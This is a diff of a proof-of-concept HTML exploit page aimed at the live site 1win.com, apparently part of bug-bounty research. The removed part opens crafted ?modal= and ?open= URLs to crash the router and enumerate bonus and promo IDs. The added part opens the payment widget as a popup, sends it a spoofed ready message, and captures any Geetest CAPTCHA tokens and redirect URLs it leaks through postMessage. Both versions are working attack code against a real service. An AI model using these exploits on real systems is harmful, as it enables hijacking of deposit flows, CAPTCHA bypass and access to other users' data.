@@ -1,157 +1,102 @@
 <!DOCTYPE html>
 <!--
-  PoC 5: ?modal= Parameter — JSON.parse No Try/Catch + Bonus IDOR
+  PoC 1: __WIDGET_REDIRECT_FORM_READY__ No-Origin-Check → Deposit Flow Hijack
 
-  VULNERABILITY: In main-BhlJaWic.js, Vue Router beforeEach hook:
-    const o = JSON.parse(route.query.modal)   // NO try/catch
-    → router.push({ name: o.name, props: o.props })
+  VULNERABILITY: Ch() in /paywidget/assets/index-CCDnOddw.js listens for
+  "__WIDGET_REDIRECT_FORM_READY__" with NO origin check.
 
-  BUG A — DoS / Unhandled Exception:
-    https://1win.com/?modal=INVALID
-    → JSON.parse throws → unhandled exception in router hook → navigation breaks
+  FLOW:
+    1. Attacker opens paywidget as popup (becomes window.opener)
+    2. Attacker sends __WIDGET_REDIRECT_FORM_READY__ to paywidget
+    3. Ch() resolves — paywidget thinks parent is ready, unblocks deposit creation
+    4. Paywidget sends geetestResult back to window.opener (attacker) with targetOrigin="*"
+    5. Attacker harvests Geetest CAPTCHA token
 
-  BUG B — Bonus IDOR:
-    https://1win.com/?modal={"name":"modal-bonus-universal","props":{"bonusId":"99999"}}
-    → Forces display of bonus modal for arbitrary bonusId
-    → Test: enumerate bonusId values to access bonuses not belonging to your account
-
-  BUG C — Modal Name Injection (open any internal modal):
-    Known modal names from JS analysis:
-    - "modal-bonus-universal"        → bonus details
-    - "promo-landings:promotion-custom-modal" → custom promo (via ?open=)
-    Enumerate others from router config.
-
-  BUG D — Chained with ?open= IDOR:
-    ?open=promotion-custom-modal&key=<ID>
-    → triggers promo-landings:promotion-custom-modal(ID) shortcut
-    → enumerate promo IDs for unauthorized access
+  REQUIRES: Victim is logged into 1win.com (cookies present)
+  IMPACT: CAPTCHA bypass tokens harvested, deposit flow unblocked by untrusted party
 -->
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PoC 5 - ?modal= IDOR + JSON.parse Crash</title>
+  <title>PoC 1 - WIDGET_READY Spoof + Geetest Harvest</title>
   <style>
-    body { font-family: monospace; background: #0a1a0a; color: #afa; padding: 20px; }
-    h2 { color: #f70; }
-    .box { background: #000; border: 1px solid #5f5; padding: 12px; margin: 10px 0; }
-    label { color: #7f7; display: block; margin-top: 8px; }
-    input, textarea { background: #0a1a0a; color: #afa; border: 1px solid #5f5; padding: 6px; width: 100%; box-sizing: border-box; }
-    textarea { height: 80px; font-family: monospace; }
-    button { background: #001a00; color: #afa; border: 1px solid #5f5; padding: 8px 14px; cursor: pointer; margin: 3px; }
-    button.danger { border-color: #f44; color: #f44; }
-    .url { word-break: break-all; color: #ff9; }
-    code { background: #001; padding: 2px 5px; color: #ff9; }
+    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+    h2 { color: #ff0; }
+    #log { background: #000; border: 1px solid #0f0; padding: 10px; height: 400px; overflow-y: auto; }
+    .evt { color: #0ff; } .warn { color: #ff0; } .hit { color: #f00; font-weight: bold; }
+    button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px 16px; cursor: pointer; margin: 4px; }
   </style>
 </head>
 <body>
-  <h2>PoC 5 — ?modal= JSON Injection + Bonus IDOR</h2>
-
-  <!-- BUG A: DoS -->
-  <div class="box">
-    <b style="color:#f44">BUG A — DoS: Unhandled JSON.parse Exception</b><br>
-    <code>?modal=INVALID</code> → <code>JSON.parse("INVALID")</code> throws in Vue Router hook<br>
-    → Page navigation breaks, router state corrupted<br><br>
-    <button class="danger" onclick="window.open('https://1win.com/?modal=INVALID_JSON_CRASH', '_blank')">
-      Open DoS PoC
-    </button>
-    <button onclick="window.open('https://1win.com/?modal=', '_blank')">
-      Empty modal param
-    </button>
-    <button onclick="window.open('https://1win.com/?modal=null', '_blank')">
-      null modal param
-    </button>
-  </div>
-
-  <!-- BUG B: Bonus IDOR -->
-  <div class="box">
-    <b style="color:#fa0">BUG B — Bonus IDOR via modal-bonus-universal</b><br>
-    Forces display of bonus details for ANY bonusId — test if bonus data leaks for other users.<br><br>
-    <label>Bonus ID to test:</label>
-    <input type="number" id="bonusId" value="9999" min="1">
-    <button onclick="openBonusModal()">Open Bonus Modal</button>
-    <button onclick="enumerateBonuses()">Enumerate 1–20</button>
-    <div id="bonusUrl" class="url" style="margin-top:6px;"></div>
-  </div>
-
-  <!-- BUG C: Arbitrary modal injection -->
-  <div class="box">
-    <b style="color:#fa0">BUG C — Arbitrary Modal Name Injection</b><br>
-    <label>Modal payload JSON:</label>
-    <textarea id="modalPayload">{"name":"modal-bonus-universal","props":{"bonusId":"1"}}</textarea>
-    <button onclick="openCustomModal()">Open Custom Modal</button>
-    <div id="customUrl" class="url" style="margin-top:6px;"></div>
-    <br>
-    <b>Other modal names to try:</b><br>
-    <button onclick="tryModal('modal-bonus-universal', {bonusId:'1'})">modal-bonus-universal</button>
-    <button onclick="tryModal('modal-deposit', {})">modal-deposit</button>
-    <button onclick="tryModal('modal-withdrawal', {})">modal-withdrawal</button>
-    <button onclick="tryModal('modal-login', {})">modal-login</button>
-    <button onclick="tryModal('modal-register', {})">modal-register</button>
-  </div>
-
-  <!-- BUG D: ?open= promo IDOR -->
-  <div class="box">
-    <b style="color:#fa0">BUG D — ?open= Promo ID IDOR</b><br>
-    <code>?open=promotion-custom-modal&key=ID</code> → triggers internal promo modal for any ID<br><br>
-    <label>Promo Key/ID:</label>
-    <input type="text" id="promoKey" value="1">
-    <button onclick="openPromoModal()">Open Promo Modal</button>
-    <button onclick="enumeratePromos()">Enumerate 1–20</button>
-    <div id="promoUrl" class="url" style="margin-top:6px;"></div>
-  </div>
+  <h2>PoC 1 — __WIDGET_REDIRECT_FORM_READY__ No-Origin-Check</h2>
+  <p>Target: <code>https://1win.com/paywidget/form</code></p>
+  <button onclick="runPoC()">Run PoC</button>
+  <button onclick="clearLog()">Clear</button>
+  <div id="log"></div>
 
 <script>
-function buildModalUrl(payload) {
-  return `https://1win.com/?modal=${encodeURIComponent(JSON.stringify(payload))}`;
+const TARGET = 'https://1win.com';
+const WIDGET_READY = '__WIDGET_REDIRECT_FORM_READY__';
+let paywidgetWindow = null;
+
+function log(msg, cls = '') {
+  const d = document.getElementById('log');
+  const ts = new Date().toISOString().slice(11, 23);
+  d.innerHTML += `<div class="${cls}">[${ts}] ${msg}</div>`;
+  d.scrollTop = d.scrollHeight;
 }
 
-function openBonusModal() {
-  const id = document.getElementById('bonusId').value;
-  const url = buildModalUrl({ name: 'modal-bonus-universal', props: { bonusId: id } });
-  document.getElementById('bonusUrl').textContent = url;
-  window.open(url, '_blank');
-}
+// Listen for ALL messages from any origin (including the paywidget)
+window.addEventListener('message', function(e) {
+  log(`RECEIVED message from origin: <b>${e.origin}</b>`, 'evt');
+  log(`  data: ${JSON.stringify(e.data)}`, 'evt');
 
-function enumerateBonuses() {
-  for (let i = 1; i <= 20; i++) {
-    const url = buildModalUrl({ name: 'modal-bonus-universal', props: { bonusId: String(i) } });
-    window.open(url, `bonus_${i}`);
-    // Stagger to avoid popup blocker
-    if (i < 5) setTimeout(() => {}, i * 200);
+  // This is what we're after: paywidget sends geetestResult to opener (us) with NO targetOrigin
+  if (e.data && e.data.type === 'geetestResult') {
+    log(`[!!! HIT !!!] Geetest token captured from ${e.origin}`, 'hit');
+    log(`  payload: ${JSON.stringify(e.data.payload)}`, 'hit');
   }
-}
 
-function openCustomModal() {
-  try {
-    const payload = JSON.parse(document.getElementById('modalPayload').value);
-    const url = buildModalUrl(payload);
-    document.getElementById('customUrl').textContent = url;
-    window.open(url, '_blank');
-  } catch(e) {
-    alert('Invalid JSON: ' + e.message);
+  // Also catch any redirect messages leaking from paywidget
+  if (e.data && e.data.type === 'redirect') {
+    log(`[!!! HIT !!!] Redirect URL captured: ${e.data.payload?.url}`, 'hit');
   }
-}
+});
 
-function tryModal(name, props) {
-  const url = buildModalUrl({ name, props });
-  document.getElementById('customUrl').textContent = url;
-  window.open(url, '_blank');
-}
+function runPoC() {
+  log('Opening paywidget as popup (attacker becomes window.opener)...', 'warn');
 
-function openPromoModal() {
-  const key = document.getElementById('promoKey').value;
-  const url = `https://1win.com/?open=promotion-custom-modal&key=${encodeURIComponent(key)}`;
-  document.getElementById('promoUrl').textContent = url;
-  window.open(url, '_blank');
-}
+  // Real URL discovered from billing.js source:
+  // window.open(`/paywidget/form?locale=${lang}&origin_type=${k}`)
+  // Only needs locale + origin_type — auth is via session cookies
+  paywidgetWindow = window.open(
+    TARGET + '/paywidget/form?locale=en&origin_type=deposit',
+    'paywidget',
+    'width=500,height=700,left=100,top=100'
+  );
 
-function enumeratePromos() {
-  for (let i = 1; i <= 20; i++) {
-    const url = `https://1win.com/?open=promotion-custom-modal&key=${i}`;
-    setTimeout(() => window.open(url, `promo_${i}`), i * 300);
+  if (!paywidgetWindow) {
+    log('Popup blocked! Allow popups for this page.', 'warn');
+    return;
   }
+
+  log('Popup opened. Waiting 3s for paywidget to load...', 'warn');
+
+  // Give paywidget time to set up its Ch() listener
+  setTimeout(() => {
+    log(`Sending spoofed "${WIDGET_READY}" to paywidget with targetOrigin="*"...`, 'warn');
+
+    // Ch() in paywidget has NO origin check — any sender works
+    paywidgetWindow.postMessage(WIDGET_READY, '*');
+
+    log('Message sent! Waiting for paywidget to send geetestResult back to us (window.opener)...', 'warn');
+    log('(paywidget uses window.opener.postMessage with no targetOrigin)', 'warn');
+  }, 3000);
+}
+
+function clearLog() {
+  document.getElementById('log').innerHTML = '';
 }
 </script>
 </body>
 </html>
-
